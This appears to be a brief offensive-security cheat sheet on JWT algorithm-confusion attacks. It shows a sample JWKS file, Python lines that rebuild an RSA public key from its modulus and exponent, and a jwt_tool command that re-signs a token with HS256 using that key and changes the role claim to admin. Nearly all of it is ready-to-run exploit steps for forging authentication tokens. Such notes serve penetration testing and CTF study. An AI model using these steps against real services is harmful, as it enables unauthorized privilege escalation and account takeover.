---
title: "JWT"
date: 2024-8-1
tags: ["jwt", "jwks", "forge", "cookies"]
---

---
### Algorithm confusion

#### 0. Sample jwks.json

```
{ 
    "keys": [
        {
        "kty": "RSA",
        "use": "sig",
        "alg": "RS256",
        "n": "<some_long_base64_encoded_number>",
        "e": "AQAB"
        }
    ]
}
```

#### 1. Create a public key

```bash
python3
```

```bash
from base64 import urlsafe_b64decode
```

```bash
from Crypto.PublicKey import RSA
```

```bash
e = int.from_bytes(urlsafe_b64decode(b'AQAB'))
```

```bash
n = int.from_bytes(urlsafe_b64decode(b'<some_long_base64_encoded_number>'))
```

```bash
key = RSA.construct((n, e))
```

```bash
print(key.exportKey().decode())
```

#### 2. Forge jwt

[jwt_tool](https://github.com/ticarpi/jwt_tool)

```bash
# For example, modify role to admin
python3 jwt_tool.py -S hs256 -k public.pem -I -pc role -pv admin <JWT>
```

<br>